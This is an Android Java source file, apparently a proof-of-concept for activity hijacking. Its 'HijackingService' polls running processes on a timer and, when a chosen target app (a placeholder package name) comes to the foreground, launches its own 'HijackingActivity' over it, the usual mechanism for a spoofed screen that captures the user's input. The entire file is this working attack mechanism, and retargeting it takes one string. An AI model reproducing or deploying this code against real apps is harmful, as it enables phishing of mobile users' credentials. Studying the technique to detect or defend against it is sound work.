package com.example.ah.activityhijacking;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class HijackingService extends Service {

    public void onCreate() {
        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                List<ActivityManager.RunningAppProcessInfo> infos = am.getRunningAppProcesses();
                for (ActivityManager.RunningAppProcessInfo psinfo : infos) {
                    if (psinfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                        if (!hijacked && "com.example.hoho.hoho".equals(psinfo.processName)) {
                            hijacked = true;
                            Intent intent = new Intent(getApplicationContext(), HijackingActivity.class);
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            intent.putExtra("processName", "com.example.hoho.hoho");
                            getApplication().startActivity(intent);
                        }
                    }
                }
            }
        };
        Timer timer = new Timer();
        timer.scheduleAtFixedRate(task, 5000, 20000);
    }

    boolean hijacked = false;

    public HijackingService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

}
